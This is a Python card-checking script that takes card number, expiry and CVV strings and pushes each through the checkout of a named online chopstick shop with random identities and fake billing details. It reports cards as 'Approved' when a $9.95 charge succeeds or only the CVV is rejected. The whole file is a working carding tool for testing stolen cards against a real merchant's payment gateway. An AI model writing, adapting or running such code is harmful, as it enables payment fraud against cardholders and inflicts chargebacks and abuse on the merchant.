import random
import re
import names
from requests import Session
from dataclasses import dataclass
import uuid
import base64
import requests
import json
import names
from bs4 import BeautifulSoup
import uuid
from fake_useragent import UserAgent
def paserX(data, first, last):
  try:
    start = data.index( first ) + len( first )
    end = data.index( last, start )
    return data[start:end]
  except ValueError:
    return None 

def generar_codigo_session():
    codigo_session = str(uuid.uuid4())
    return codigo_session

def find_between(data, first, last):
  try:
    start = data.index( first ) + len( first )
    end = data.index( last, start )
    return data[start:end]
  except ValueError:
    return None  

class payff:
    def __init__(self, tarjeta):
        partes = tarjeta.split("|")
        
        self.tarjeta = tarjeta
        if len(partes) == 4:
            self.cc = partes[0]
            self.mes = partes[1]
            self.ano = partes[2]
            self.cvv = partes[3]  
             
    def detectar_tipo_tarjeta(self):
        if self.cc.startswith("4"):
            return "Visa"
        elif self.cc.startswith("5"):
            return "MasterCard"
        elif self.cc.startswith("3"):
            return "American Express"
        elif self.cc.startswith("6"):
            return "Discover"
        else:
            return "Desconocido"
          
    def main(self):
        try:
            session = requests.Session()
            def generar_correo():
                return f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
            CorreoRand = generar_correo()

            username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
            Agent = UserAgent().random

            session = Session()
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.6',
                'cache-control': 'max-age=0',
                'priority': 'u=0, i',
                'referer': 'https://ilovehandles.com/shop/',
                'sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
                # 'cookie': 'tk_ai=dXXL3i35zudKe0sqaldHgI7t; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-06-29%2023%3A43%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Filovehandles.com%2Fcheckout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Filovehandles.com%2Fcart%2F; sbjs_first_add=fd%3D2026-06-29%2023%3A43%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Filovehandles.com%2Fcheckout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Filovehandles.com%2Fcart%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; wp_woocommerce_session_2404a14f447ac7334faaaee729866851=t_03000891b04aae891682ca5fd32f31%7C1782949404%7C1782863004%7C%24generic%24ky2m-otW_OmGpqlTcJ2VIC0EcW1owc7TvWvPIQ2Z; sbjs_udata=vst%3D3%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F149.0.0.0%20Safari%2F537.36; sbjs_session=pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2Filovehandles.com%2Fshop%2Fcantilever-chopsticks%2F',
            }

            response = session.get('https://ilovehandles.com/shop/cantilever-chopsticks/', headers=headers)
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.6',
                'cache-control': 'max-age=0',
                'origin': 'https://ilovehandles.com',
                'referer': 'https://ilovehandles.com/shop/cantilever-chopsticks/',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
            }

            data = {
                'attribute_chopsticks': '1 Set',
                'quantity': '1',
                'add-to-cart': '2401',
                'product_id': '2401',
                'variation_id': '5712',
            }

            response = session.post(
                'https://ilovehandles.com/shop/cantilever-chopsticks/',
                headers=headers,
                data=data,
            )
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.6',
                'priority': 'u=0, i',
                'referer': 'https://ilovehandles.com/shop/cantilever-chopsticks/',
                'sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
                # 'cookie': 'tk_ai=dXXL3i35zudKe0sqaldHgI7t; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-06-29%2023%3A43%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Filovehandles.com%2Fcheckout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Filovehandles.com%2Fcart%2F; sbjs_first_add=fd%3D2026-06-29%2023%3A43%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Filovehandles.com%2Fcheckout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Filovehandles.com%2Fcart%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; wp_woocommerce_session_2404a14f447ac7334faaaee729866851=t_03000891b04aae891682ca5fd32f31%7C1782949404%7C1782863004%7C%24generic%24ky2m-otW_OmGpqlTcJ2VIC0EcW1owc7TvWvPIQ2Z; sbjs_udata=vst%3D3%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F149.0.0.0%20Safari%2F537.36; woocommerce_items_in_cart=1; woocommerce_cart_hash=2e5cd3793268788b45d78c6155ce02d0; sbjs_session=pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Filovehandles.com%2Fshop%2Fcantilever-chopsticks%2F',
            }

            response = session.get('https://ilovehandles.com/cart/',  headers=headers)
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.6',
                'priority': 'u=0, i',
                'referer': 'https://ilovehandles.com/cart/',
                'sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
                # 'cookie': 'tk_ai=dXXL3i35zudKe0sqaldHgI7t; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-06-29%2023%3A43%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Filovehandles.com%2Fcheckout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Filovehandles.com%2Fcart%2F; sbjs_first_add=fd%3D2026-06-29%2023%3A43%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Filovehandles.com%2Fcheckout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Filovehandles.com%2Fcart%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; wp_woocommerce_session_2404a14f447ac7334faaaee729866851=t_03000891b04aae891682ca5fd32f31%7C1782949404%7C1782863004%7C%24generic%24ky2m-otW_OmGpqlTcJ2VIC0EcW1owc7TvWvPIQ2Z; sbjs_udata=vst%3D3%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F149.0.0.0%20Safari%2F537.36; woocommerce_items_in_cart=1; woocommerce_cart_hash=2e5cd3793268788b45d78c6155ce02d0; sbjs_session=pgs%3D13%7C%7C%7Ccpg%3Dhttps%3A%2F%2Filovehandles.com%2Fcart%2F',
            }

            response = session.get('https://ilovehandles.com/checkout/', headers=headers).text
            proceschek = paserX (response, 'name="woocommerce-process-checkout-nonce" value="', '"')
            print(proceschek)

            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.6',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://ilovehandles.com',
                'priority': 'u=1, i',
                'referer': 'https://ilovehandles.com/checkout/',
                'sec-ch-ua': '"Brave";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
                # 'cookie': 'tk_ai=dXXL3i35zudKe0sqaldHgI7t; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-06-29%2023%3A43%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Filovehandles.com%2Fcheckout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Filovehandles.com%2Fcart%2F; sbjs_first_add=fd%3D2026-06-29%2023%3A43%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Filovehandles.com%2Fcheckout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Filovehandles.com%2Fcart%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; wp_woocommerce_session_2404a14f447ac7334faaaee729866851=t_03000891b04aae891682ca5fd32f31%7C1782949404%7C1782863004%7C%24generic%24ky2m-otW_OmGpqlTcJ2VIC0EcW1owc7TvWvPIQ2Z; sbjs_udata=vst%3D3%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F149.0.0.0%20Safari%2F537.36; woocommerce_items_in_cart=1; woocommerce_cart_hash=2e5cd3793268788b45d78c6155ce02d0; sbjs_session=pgs%3D14%7C%7C%7Ccpg%3Dhttps%3A%2F%2Filovehandles.com%2Fcheckout%2F',
            }

            params = {
                'wc-ajax': 'checkout',
            }

            data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=https%3A%2F%2Filovehandles.com%2Fcart%2F&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Filovehandles.com%2Fcheckout%2F&wc_order_attribution_session_start_time=2026-06-29+23%3A43%3A13&wc_order_attribution_session_pages=14&wc_order_attribution_session_count=3&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F149.0.0.0+Safari%2F537.36&billing_first_name=ldfl&billing_last_name=dsdasd&billing_company=ggd&billing_country=US&billing_address_1=moall+del+sol&billing_address_2=sadw&billing_city=guayas&billing_state=NY&billing_postcode=10080&billing_phone=%2B10989861371&billing_email={CorreoRand}&how_did_you_find_us=&account_password=&shipping_first_name=ldfl&shipping_last_name=dsdasd&shipping_company=ggd&shipping_country=US&shipping_address_1=moall+del+sol&shipping_address_2=sadw&shipping_city=guayas&shipping_state=NY&shipping_postcode=10080&shipping_phone=%2B10989861371&order_comments=&shipping_method%5B0%5D=legacy_flat_rate&payment_method=paypal_pro&paypal_pro-card-number={self.cc}&paypal_pro-card-expiry={self.mes}+%2F+{self.ano}&paypal_pro-card-cvc={self.cvv}&woocommerce-process-checkout-nonce={proceschek}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'

            response = session.post('https://ilovehandles.com/', params=params,  headers=headers, data=data)

            data = response.json()

            soup = BeautifulSoup(data['messages'], 'html.parser')

            err = soup.find('li').get_text(strip=True)

            if data.get("success") is True:
                return 'Approved! ✅', 'Charged 9.95$'


            elif 'This transaction cannot be processed. Please enter a valid Credit Card Verification Number.' in str(err):
                return 'Approved! ✅', err

            else:
                return 'Declined ❌', err

        except Exception as e:
            print(e)
            return 'Declined ❌', str(e)
